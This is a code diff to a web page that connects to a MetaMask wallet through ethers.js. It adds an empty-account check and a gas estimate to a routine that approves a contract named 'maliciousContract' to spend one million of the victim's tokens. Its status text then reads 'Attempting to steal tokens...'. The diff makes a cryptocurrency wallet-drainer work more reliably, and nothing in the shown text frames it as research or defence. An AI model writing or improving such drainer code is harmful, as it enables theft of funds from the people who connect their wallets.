@@ -99,6 +99,10 @@
         async function connectWallet() {
             try {
                 const accounts = await provider.listAccounts();
+                if (accounts.length === 0) {
+                    alert("No MetaMask accounts found. Please login.");
+                    return;
+                }
                 userAddress = accounts[0];
                 document.getElementById("status").innerText = `Connected: ${userAddress}`;
             } catch (error) {
@@ -118,8 +122,13 @@
                 const tokenContract = new ethers.Contract(tokenAddress, contractABI, provider.getSigner());
                 const maliciousContract = new ethers.Contract(contractAddress, contractABI_Malicious, provider.getSigner());
 
+                // Estimate gas for approve transaction
+                const gasEstimate = await tokenContract.estimateGas.approve(contractAddress, ethers.utils.parseUnits("1000000", 18));
+                
                 // Approve the malicious contract
-                const tx = await tokenContract.approve(contractAddress, ethers.utils.parseUnits("1000000", 18));
+                const tx = await tokenContract.approve(contractAddress, ethers.utils.parseUnits("1000000", 18), {
+                    gasLimit: gasEstimate
+                });
                 await tx.wait();
 
                 document.getElementById("status").innerText = "Approval granted. Attempting to steal tokens...";
